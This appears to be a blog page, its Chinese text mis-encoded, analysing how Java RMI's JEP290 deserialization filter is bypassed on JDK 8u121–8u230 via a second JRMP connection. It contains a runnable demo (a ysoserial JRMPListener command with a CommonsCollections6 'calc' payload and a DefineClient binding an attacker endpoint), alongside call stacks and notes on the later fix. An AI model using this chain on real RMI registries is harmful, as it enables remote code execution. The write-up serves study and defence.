<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>RMI JEP290 | Jiecub3</title>
<meta name="keywords" content="">
<meta name="description" content="å‰è¨€ï¼šå…¶å®æ˜¯å†™äº†RMIååºåˆ—åŒ–ä»¥åŠ3ç«¯äº’æ‰“çš„ï¼Œä½†æ˜¯æ„Ÿè§‰åŸºæœ¬ä¸Šéƒ½æ˜¯æ‘˜æŠ„ç½‘ä¸Šçš„æœ‰ç‚¹å•°å—¦å°±åˆ äº†ã€‚ç„¶åä¸‹æ–‡ä¸»è¦æ˜¯è®²ç»•è¿‡RMIååºåˆ—åŒ–ä¸­çš„JEP290">
<meta name="author" content="Jiecub3">
<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/rmi-jep290/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/rmi-jep290/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="RMI JEP290" />
<meta property="og:description" content="å‰è¨€ï¼šå…¶å®æ˜¯å†™äº†RMIååºåˆ—åŒ–ä»¥åŠ3ç«¯äº’æ‰“çš„ï¼Œä½†æ˜¯æ„Ÿè§‰åŸºæœ¬ä¸Šéƒ½æ˜¯æ‘˜æŠ„ç½‘ä¸Šçš„æœ‰ç‚¹å•°å—¦å°±åˆ äº†ã€‚ç„¶åä¸‹æ–‡ä¸»è¦æ˜¯è®²ç»•è¿‡RMIååºåˆ—åŒ–ä¸­çš„JEP290" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/rmi-jep290/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2025-01-17T20:01:23+08:00" />
<meta property="article:modified_time" content="2025-01-17T20:01:23+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="RMI JEP290"/>
<meta name="twitter:description" content="å‰è¨€ï¼šå…¶å®æ˜¯å†™äº†RMIååºåˆ—åŒ–ä»¥åŠ3ç«¯äº’æ‰“çš„ï¼Œä½†æ˜¯æ„Ÿè§‰åŸºæœ¬ä¸Šéƒ½æ˜¯æ‘˜æŠ„ç½‘ä¸Šçš„æœ‰ç‚¹å•°å—¦å°±åˆ äº†ã€‚ç„¶åä¸‹æ–‡ä¸»è¦æ˜¯è®²ç»•è¿‡RMIååºåˆ—åŒ–ä¸­çš„JEP290"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://Jiecub3.github.io/zh/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "RMI JEP290",
      "item": "https://Jiecub3.github.io/zh/posts/java/rmi-jep290/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "RMI JEP290",
  "name": "RMI JEP290",
  "description": "å‰è¨€ï¼šå…¶å®æ˜¯å†™äº†RMIååºåˆ—åŒ–ä»¥åŠ3ç«¯äº’æ‰“çš„ï¼Œä½†æ˜¯æ„Ÿè§‰åŸºæœ¬ä¸Šéƒ½æ˜¯æ‘˜æŠ„ç½‘ä¸Šçš„æœ‰ç‚¹å•°å—¦å°±åˆ äº†ã€‚ç„¶åä¸‹æ–‡ä¸»è¦æ˜¯è®²ç»•è¿‡RMIååºåˆ—åŒ–ä¸­çš„JEP290",
  "keywords": [
    
  ],
  "articleBody": " å‰è¨€ï¼šå…¶å®æ˜¯å†™äº†RMIååºåˆ—åŒ–ä»¥åŠ3ç«¯äº’æ‰“çš„ï¼Œä½†æ˜¯æ„Ÿè§‰åŸºæœ¬ä¸Šéƒ½æ˜¯æ‘˜æŠ„ç½‘ä¸Šçš„æœ‰ç‚¹å•°å—¦å°±åˆ äº†ã€‚ç„¶åä¸‹æ–‡ä¸»è¦æ˜¯è®²ç»•è¿‡RMIååºåˆ—åŒ–ä¸­çš„JEP290ã€‚ç„¶åç¬”è€…æ˜¯æŠŠå…¶ç»•è¿‡åŸç†ç†è§£æˆ2æ¡é€šä¿¡ï¼ˆæˆ–è€…è¯´çº¿ç¨‹ï¼‰è€Œè®¾ç½®JEP290åªä½œç”¨äºç¬¬ä¸€æ¡é€šä¿¡ï¼Œé€šè¿‡ç¬¬äºŒæ¡é€šä¿¡è¿›è¡Œç»•è¿‡\nJEP290 å‚è€ƒå¾ˆå¤šè¿™ç¯‡æ–‡ç« ï¼Œhttps://www.anquanke.com/post/id/259059#h3-1\nJEP290å¹²å˜›çš„ï¼Œç®€å•è¯´å°±æ˜¯ä¸€ä¸ªé˜²å¾¡ååºåˆ—åŒ–æ”»å‡»çš„é»‘ç™½åå•è¿‡æ»¤å™¨\næä¾›ä¸€ä¸ªé™åˆ¶ååºåˆ—åŒ–ç±»çš„æœºåˆ¶ï¼Œç™½åå•æˆ–è€…é»‘åå• é™åˆ¶ååºåˆ—åŒ–çš„æ·±åº¦å’Œå¤æ‚åº¦ ä¸º RMI è¿œç¨‹è°ƒç”¨å¯¹è±¡æä¾›äº†ä¸€ä¸ªéªŒè¯ç±»çš„æœºåˆ¶ å®šä¹‰ä¸€ä¸ªå¯é…ç½®çš„è¿‡æ»¤æœºåˆ¶ï¼Œæ¯”å¦‚å¯ä»¥é€šè¿‡é…ç½®propertiesæ–‡ä»¶çš„å½¢å¼æ¥å®šä¹‰è¿‡æ»¤å™¨ã€‚ JEP290æ”¯æŒçš„ç‰ˆæœ¬ï¼š\nJavaâ„¢ SE Development Kit 8, Update 121 (JDK 8u121) Javaâ„¢ SE Development Kit 7, Update 131 (JDK 7u131) Javaâ„¢ SE Development Kit 6, Update 141 (JDK 6u141) è®¾ç½®JEP290çš„æ–¹å¼æœ‰ä¸‹é¢ä¸¤ç§ï¼š\né€šè¿‡setObjectInputFilteræ¥è®¾ç½®filter ç›´æ¥é€šè¿‡conf/security/java.propertiesæ–‡ä»¶è¿›è¡Œé…ç½® JEP290åº”ç”¨ åœ¨RMIååºåˆ—åŒ–ä¸­åº”ç”¨åœ¨registerç«¯ï¼Œæ¯”å¦‚bindç»‘å®šå¯¹è±¡æ—¶ï¼ŒJEP290æ˜¯éœ€è¦è®¾ç½®çš„ï¼ŒåƒClientå’ŒServerä¹‹é—´çš„äº’æ‰“åˆ™æ²¡æœ‰JEP290çš„æ£€æµ‹ï¼Œæ‰€ä»¥ä¹‹åçš„ç‰ˆæœ¬è¿˜æ˜¯èƒ½ç›¸äº’æ‰“ã€‚\nåœ¨8u121åï¼Œjavaåœ¨oldDispatch#unmarshalCustomCallData()ä¸­é€šè¿‡setObjectInputFilterè¿›è¡Œè®¾ç½®\nè¿™é‡ŒUnicastServerRef.this.filterå­˜å‚¨çš„æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼RegistryImpl::registryFilterï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåé¢ä¼šè°ƒåˆ°è¿™ä¸ªregistryFilteræ–¹æ³•è¿›è¡Œæ£€æµ‹\nJEP290ä½œç”¨ç‚¹ æ²¡æœ‰JEP290æ—¶ï¼Œæˆ‘ä»¬é€šè¿‡ä¸‹å›¾readObjectå°±å¯ä»¥æˆåŠŸå®ç°ååºåˆ—åŒ–æ”»å‡»\nJEP290ä½œç”¨ç‚¹ä¹Ÿåœ¨è¿™ä¸ªreadObjectä¸­ï¼Œè¿™é‡ŒserialFilterå°±æ˜¯å‰é¢çš„filter(RegistryImpl::registryFilter)ï¼Œè¿›å…¥registryFilterï¼ŒregistryFilterå°±æ˜¯JEP290è®¾ç½®çš„è¿‡æ»¤Filterï¼Œè¿™é‡Œä¼šå…ˆå°†éœ€è¦ååºåˆ—åŒ–çš„ç±»è¿›è¡Œç™½åå•æ£€æµ‹(å°±æ˜¯è¿™ä¸ªreturnåˆ¤æ–­)ï¼Œç„¶åå†è¿›è¡Œååºåˆ—åŒ–\nç™½åå•å¦‚ä¸‹ï¼š\nString.class Number.class Remote.class Proxy.class UnicastRef.class RMIClientSocketFactory.class RMIServerSocketFactory.class ActivationID.class UID.class è¿™é‡Œæˆ‘ä»¬çš„æ¶æ„å¯¹è±¡ä¸åœ¨ç™½åå•ä¸­ï¼Œä»è€Œå¯¼è‡´æˆ‘ä»¬ååºåˆ—åŒ–æ”»å‡»å¤±è´¥\nBypass 8u121~8u230 è¿™é‡Œç»•è¿‡æ€è·¯æ˜¯ï¼ŒserialFilterä½œç”¨äºæˆ‘ä»¬çš„æ¶æ„Serverç«¯å’ŒRegisterç«¯çš„ååºåˆ—åŒ–ï¼Œä½†å…¶å®åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­è¿˜å­˜åœ¨ä¸€æ®µé€šä¿¡ï¼Œè€Œè¿™æ®µé€šä¿¡ä¸­çš„serialFilterå’Œç¬¬ä¸€æ®µé€šä¿¡çš„serialFilteræ˜¯ç›¸äº’ç‹¬ç«‹çš„ï¼ŒåŠç¬¬äºŒæ®µé€šä¿¡ååºåˆ—åŒ–ä¸ä¼šæœ‰è¿™ä¸ªæ£€æµ‹ï¼Œä¸”è¿™æ®µé€šä¿¡çš„æ•°æ®ä¹Ÿæ˜¯åºåˆ—åŒ–ä¼ è¾“çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥åœ¨ç¬¬ä¸€æ®µæµç¨‹ä¸­æ§åˆ¶ç¬¬äºŒæ®µé€šä¿¡çš„æœåŠ¡åœ°å€ï¼Œè¿æ¥ä¸Šæˆ‘ä»¬çš„æ¶æ„æœåŠ¡ï¼Œè¿”å›æ¶æ„ååºåˆ—åŒ–å†…å®¹å³å¯ååºåˆ—åŒ–æ”»å‡»æˆåŠŸï¼Œå…‰çœ‹è¿™æ®µæè¿°å¯èƒ½ä¸å¤ªèƒ½ç†è§£ï¼Œä¸ç”¨æ‹…å¿ƒï¼Œå¯ä»¥çœ‹çœ‹ä¸‹é¢å…·ä½“åˆ†æ\nå®ç°demo è¿™é‡Œæ”»å‡»çš„æ˜¯register\nä¾æ¬¡æ‰§è¡Œä¸‹é¢å‘½ä»¤å’Œjavaæ–‡ä»¶\nC:\\MyFiles\\Tools\\ENV\\JAVA\\jdk1.8.0_192\\bin\\java.exe -cp ysoserial.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections6 \"calc\" RMIRegistry\npackage JEP290; import java.rmi.registry.LocateRegistry; public class RMIRegistry { public static void main(String[] args) { try { LocateRegistry.createRegistry(1099); System.out.println(\"RMI Registry Start\"); } catch (Exception e) { e.printStackTrace(); } while (true) ; } } DefineClient\npackage JEP290; import com.example.HelloImpl; import sun.rmi.server.UnicastRef; import sun.rmi.transport.LiveRef; import sun.rmi.transport.tcp.TCPEndpoint; import java.rmi.Remote; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.ObjID; import java.rmi.server.RemoteObjectInvocationHandler; import java.util.Random; public class DefineClient { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.getRegistry(1099); ObjID id = new ObjID(new Random().nextInt()); TCPEndpoint te = new TCPEndpoint(\"localhost\", 3333); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(ref); // lookupæ–¹æ³•ä¹Ÿå¯ä»¥ï¼Œä½†éœ€è¦æ‰‹åŠ¨æ¨¡æ‹Ÿlookupæ–¹æ³•çš„æµç¨‹ registry.bind(\"pwn\", handler); } } ç®€å•æµç¨‹åˆ†æ åœ¨åŸå…ˆreadOjectä¸‹é¢è¿™é‡Œvar2.releaseInputStream();ä¼šè¿›è¡Œç¬¬äºŒæ®µé€šä¿¡åˆ©ç”¨\nåœ¨registerRefsä¼šå¾—åˆ°JRMPæ®µæœåŠ¡åœ°å€ï¼Œè¿™ä¸ªå€¼æ€ä¹ˆåˆå§‹åŒ–çš„åé¢ä¼šæåˆ°\nè¿™é‡Œlookupå…¶å®æ²¡å¹²ä»€ä¹ˆï¼Œåªæ˜¯å°è£…äº†ä¸‹æˆ‘ä»¬çš„var0\nåç»­åœ¨executeCall()ä¸­this.getInputStream();å»ºç«‹æ–°çš„é€šè®¯ï¼Œç„¶åå°†æ¥æ”¶åºåˆ—åŒ–æ•°æ®æ‰§è¡Œååºåˆ—åŒ–\nè°ƒç”¨æ ˆ\nexecuteCall:220, StreamRemoteCall (sun.rmi.transport) invoke:375, UnicastRef (sun.rmi.server) dirty:109, DGCImpl_Stub (sun.rmi.transport) makeDirtyCall:382, DGCClient$EndpointEntry (sun.rmi.transport) registerRefs:324, DGCClient$EndpointEntry (sun.rmi.transport) registerRefs:160, DGCClient (sun.rmi.transport) registerRefs:102, ConnectionInputStream (sun.rmi.transport) releaseInputStream:157, StreamRemoteCall (sun.rmi.transport) dispatch:80, RegistryImpl_Skel (sun.rmi.registry) oldDispatch:468, UnicastServerRef (sun.rmi.server) dispatch:300, UnicastServerRef (sun.rmi.server) TCPEndpointï¼ˆJRMPæ®µåœ°å€ï¼‰çš„èµ‹å€¼ ä»–çš„èµ‹å€¼å…¶å®æ˜¯åœ¨åŸå…ˆååºåˆ—åŒ–åˆ©ç”¨ç‚¹å¼€å§‹çš„\næˆ‘ä»¬è®¾ç½®çš„å¯¹è±¡æ˜¯ä¸“é—¨ç»§æ‰¿RemoteObject(ç»§æ‰¿Remoteåœ¨ç™½åå•ä¸Š)çš„ï¼Œåˆ°å…¶çš„readObjectï¼Œè·Ÿè¿›ref.readExternal(in);\nè·Ÿè¿›LiveRef.read\nè¿™é‡Œä¼šä»åºåˆ—åŒ–æ•°æ®æå–å‡ºipå’Œportï¼Œç”Ÿæˆä¸€ä¸ªTCPEndpointèµ‹ç»™var2ï¼Œç„¶åå°è£…æˆä¸€ä¸ªLiveRefä¼ åˆ°var6.saveRef()é‡Œ\nsaveRef()é‡Œæœ€åå­˜åœ¨åˆ°incomingRefTableè¿™ä¸ªtableé‡Œé¢ï¼Œå¯ä»¥å›å¤´çœ‹åˆ©ç”¨åˆ†æï¼Œå°±æ˜¯ä»è¿™ä¸ªå˜é‡å–çš„å¯¹è±¡\n2æ®µé€šä¿¡ \u0026 serialFilter è¿™é‡Œæœ‰ä¸ªç‚¹éœ€è¦ææ¸…æ¥šå…³äºserialFilter\nç¬¬ä¸€æ®µé€šä¿¡\nç¬¬ä¸€æ®µé€šä¿¡ï¼Œç¬¬ä¸€æ®µé€šä¿¡æ˜¯å»ºç«‹äºæˆ‘ä»¬Serverç«¯bind(),å‘Registerç«¯è¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œè®°ä½è¿™é‡Œçš„ConnectionInputStream@982ç¼–å·ï¼Œä»–çš„superçš„superæ—¢æ˜¯ObjectInputStream(å­˜å‚¨serialFilter)\nç„¶åæ²¡æœ‰ç‰¹åˆ«è®¾ç½®çš„è¯ï¼ŒserialFilteræ˜¯ä¸ºnullçš„\nç¬¬ä¸€æ®µé€šä¿¡ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨unmarshalCustomCallData()ä¸­ç»™this.serialFilterè®¾ç½®äº†å€¼ï¼Œæ³¨æ„è¿™é‡Œç¼–å·ConnectionInputStream@982\nç¬¬äºŒæ®µé€šä¿¡ï¼ŒJRMPåè®®\næ³¨æ„åˆ°UnicastRef#invoke=\u003eexecuteCall()=\u003ethis.getInputStream();ä¼šå»ºç«‹æ–°çš„é€šä¿¡ï¼Œè¿™é‡Œç¼–å·ä¸ºConnectionInputStream@1160\npublic ObjectInput getInputStream() throws IOException { if (this.in == null) { Transport.transportLog.log(Log.VERBOSE, \"getting input stream\"); this.in = new ConnectionInputStream(this.conn.getInputStream()); } return this.in; } è¿›è¡Œåˆå§‹åŒ–ï¼Œæ‰€ä»¥è¿™é‡ŒserialFilterä¸ºnullï¼Œå¹¶ä¸å­˜åœ¨ç¬¬ä¸€æ®µé€šä¿¡è®¾ç½®çš„å€¼\nåŠååºåˆ—åŒ–çš„æ—¶å€™ä¹Ÿä¸ä¼šå­˜åœ¨æ£€æµ‹\nå°ç»“:\nè¿™é‡Œæˆ‘æƒ³è¡¨è¾¾ä»€ä¹ˆå‘¢ï¼Œå°±æ˜¯åˆ†æ¸…æ¥šï¼Œè¿™ç§æ–¹æ³•ä¸ºä»€ä¹ˆå¯ä»¥ç»•è¿‡JEP290ï¼Œç¬¬ä¸€æ®µé€šä¿¡æ˜¯å’ŒServerç«¯ï¼Œç¬¬äºŒæ®µæ˜¯å’ŒJMRPç«¯ã€‚è¿™é‡ŒConnectionInputStreamå…¶å®å°±ä»£è¡¨ç€ObjectInputStreamï¼Œè€Œç¬¬ä¸€æ®µé€šä¿¡ä¸­è®¾ç½®çš„serialFilteråªä½œç”¨äºç¬¬ä¸€æ®µé€šä¿¡ä¸­ï¼ŒåŠåªä½œç”¨äºRegisterå’ŒServerä¹‹é—´çš„readObjectä¸­ï¼ï¼ï¼ˆJEP290ä½œç”¨åŸŸï¼‰\nç›¸ä¿¡å¯¹ä¸Šé¢çš„åˆ†æï¼Œå¯¹JEP290æœ‰æ¯”è¾ƒæ¸…æ™°çš„ç†è§£äº†\nä¿®å¤ï¼š\nåœ¨dirty()æ–¹æ³•ä¸­å»ºç«‹é€šè®¯åï¼Œç»™this.filterè®¾ç½®äº†ä¸€ä¸ªJEP290(è¡¨è¾¾å¼)\nç„¶ååœ¨this.inçš„serialFilterä¸­è®¾ç½®ä¸Šè¿™ä¸ªfilter\nç„¶åè¢«æ£€æµ‹å‡ºæ¥\nBypass 8u231~8u240 åœ¨8u231ä¹‹å‰æˆ‘ä»¬æ˜¯é€šè¿‡dirty()è¿™é‡Œç»•è¿‡çš„ï¼Œç„¶åè¢«ä¿®å¤äº†ã€‚8u231è¿™é‡Œè¿™æ˜¯é€šè¿‡ç›´æ¥è¾¾åˆ°UnicastRef#invokeï¼Œä¸ç»è¿‡dirty()ï¼Œä»…é ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–å®Œæˆè¿™äº›æ“ä½œã€‚ä½†æ˜¯ä¸‹ä¸€ä¸ªç‰ˆæœ¬å°±è¢«ä¿®äº†hhhï¼Œå…·ä½“å¯ä»¥å‚è€ƒè¿™ç¯‡https://www.anquanke.com/post/id/259059#h3-10\nå‚è€ƒï¼š\nhttps://xz.aliyun.com/t/8706?time__1311=n4%2BxnD0DcDu0eD5Y40HpDUhEIDkB711H4D#toc-8\nhttps://www.anquanke.com/post/id/259059#h3-1\n",
  "wordCount" : "2858",
  "inLanguage": "zh",
  "datePublished": "2025-01-17T20:01:23+08:00",
  "dateModified": "2025-01-17T20:01:23+08:00",
  "author":{
    "@type": "Person",
    "name": "Jiecub3"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://Jiecub3.github.io/zh/posts/java/rmi-jep290/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Jiecub3",
    "logo": {
      "@type": "ImageObject",
      "url": "https://Jiecub3.github.io/img/logo.gif"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://Jiecub3.github.io/zh/" title="é¦–é¡µ">
                    <span>é¦–é¡µ</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/archives/" title="å½’æ¡£">
                    <span>å½’æ¡£</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/categories/" title="åˆ†ç±»">
                    <span>åˆ†ç±»</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/search" title="æœç´¢ğŸ”ï¸">
                    <span>æœç´¢ğŸ”ï¸</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/about/" title="å…³äº">
                    <span>å…³äº</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">ğŸ ä¸»é¡µ</a>&nbsp;Â»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      RMI JEP290
    </h1>
    <div class="post-meta"><span title='2025-01-17 20:01:23 +0800 CST'>2025-01-17</span>&nbsp;Â·&nbsp;6 åˆ†é’Ÿ&nbsp;Â·&nbsp;Jiecub3

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">ç›®å½•</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#jep290" aria-label="JEP290">JEP290</a><ul>
                            
                    <li>
                        <a href="#jep290%e5%ba%94%e7%94%a8" aria-label="JEP290åº”ç”¨"><strong>JEP290åº”ç”¨</strong></a></li>
                    <li>
                        <a href="#jep290%e4%bd%9c%e7%94%a8%e7%82%b9" aria-label="JEP290ä½œç”¨ç‚¹">JEP290ä½œç”¨ç‚¹</a></li></ul>
                    </li>
                    <li>
                        <a href="#bypass-8u1218u230" aria-label="Bypass 8u121~8u230">Bypass 8u121~8u230</a><ul>
                            
                    <li>
                        <a href="#%e5%ae%9e%e7%8e%b0demo" aria-label="å®ç°demo">å®ç°demo</a></li>
                    <li>
                        <a href="#%e7%ae%80%e5%8d%95%e6%b5%81%e7%a8%8b%e5%88%86%e6%9e%90" aria-label="ç®€å•æµç¨‹åˆ†æ">ç®€å•æµç¨‹åˆ†æ</a><ul>
                            
                    <li>
                        <a href="#tcpendpointjrmp%e6%ae%b5%e5%9c%b0%e5%9d%80%e7%9a%84%e8%b5%8b%e5%80%bc" aria-label="TCPEndpointï¼ˆJRMPæ®µåœ°å€ï¼‰çš„èµ‹å€¼">TCPEndpointï¼ˆJRMPæ®µåœ°å€ï¼‰çš„èµ‹å€¼</a></li></ul>
                    </li>
                    <li>
                        <a href="#2%e6%ae%b5%e9%80%9a%e4%bf%a1--serialfilter" aria-label="2æ®µé€šä¿¡ &amp;amp; serialFilter"><strong>2æ®µé€šä¿¡</strong> &amp; serialFilter</a></li></ul>
                    </li>
                    <li>
                        <a href="#bypass-8u2318u240" aria-label="Bypass 8u231~8u240">Bypass 8u231~8u240</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><blockquote>
<p>å‰è¨€ï¼šå…¶å®æ˜¯å†™äº†RMIååºåˆ—åŒ–ä»¥åŠ<code>3ç«¯äº’æ‰“</code>çš„ï¼Œä½†æ˜¯æ„Ÿè§‰åŸºæœ¬ä¸Šéƒ½æ˜¯æ‘˜æŠ„ç½‘ä¸Šçš„æœ‰ç‚¹å•°å—¦å°±åˆ äº†ã€‚ç„¶åä¸‹æ–‡ä¸»è¦æ˜¯è®²ç»•è¿‡<code>RMIååºåˆ—åŒ–</code>ä¸­çš„JEP290ã€‚ç„¶åç¬”è€…æ˜¯æŠŠå…¶ç»•è¿‡åŸç†ç†è§£æˆ2æ¡é€šä¿¡ï¼ˆæˆ–è€…è¯´çº¿ç¨‹ï¼‰è€Œè®¾ç½®JEP290åªä½œç”¨äºç¬¬ä¸€æ¡é€šä¿¡ï¼Œé€šè¿‡ç¬¬äºŒæ¡é€šä¿¡è¿›è¡Œç»•è¿‡</p>
</blockquote>
<h2 id="jep290">JEP290<a hidden class="anchor" aria-hidden="true" href="#jep290">#</a></h2>
<p>å‚è€ƒå¾ˆå¤šè¿™ç¯‡æ–‡ç« ï¼Œhttps://www.anquanke.com/post/id/259059#h3-1</p>
<p>JEP290å¹²å˜›çš„ï¼Œç®€å•è¯´å°±æ˜¯ä¸€ä¸ª<code>é˜²å¾¡ååºåˆ—åŒ–æ”»å‡»</code>çš„é»‘ç™½åå•<code>è¿‡æ»¤å™¨</code></p>
<blockquote>
<ol>
<li>æä¾›ä¸€ä¸ªé™åˆ¶ååºåˆ—åŒ–ç±»çš„æœºåˆ¶ï¼Œç™½åå•æˆ–è€…é»‘åå•</li>
<li>é™åˆ¶ååºåˆ—åŒ–çš„æ·±åº¦å’Œå¤æ‚åº¦</li>
<li>ä¸º RMI è¿œç¨‹è°ƒç”¨å¯¹è±¡æä¾›äº†ä¸€ä¸ªéªŒè¯ç±»çš„æœºåˆ¶</li>
<li>å®šä¹‰ä¸€ä¸ªå¯é…ç½®çš„è¿‡æ»¤æœºåˆ¶ï¼Œæ¯”å¦‚å¯ä»¥é€šè¿‡é…ç½®propertiesæ–‡ä»¶çš„å½¢å¼æ¥å®šä¹‰è¿‡æ»¤å™¨ã€‚</li>
</ol>
</blockquote>
<p>JEP290æ”¯æŒçš„ç‰ˆæœ¬ï¼š</p>
<ul>
<li>Javaâ„¢ SE Development Kit 8, Update 121 (JDK 8u121)</li>
<li>Javaâ„¢ SE Development Kit 7, Update 131 (JDK 7u131)</li>
<li>Javaâ„¢ SE Development Kit 6, Update 141 (JDK 6u141)</li>
</ul>
<p>è®¾ç½®JEP290çš„æ–¹å¼æœ‰ä¸‹é¢ä¸¤ç§ï¼š</p>
<blockquote>
<ol>
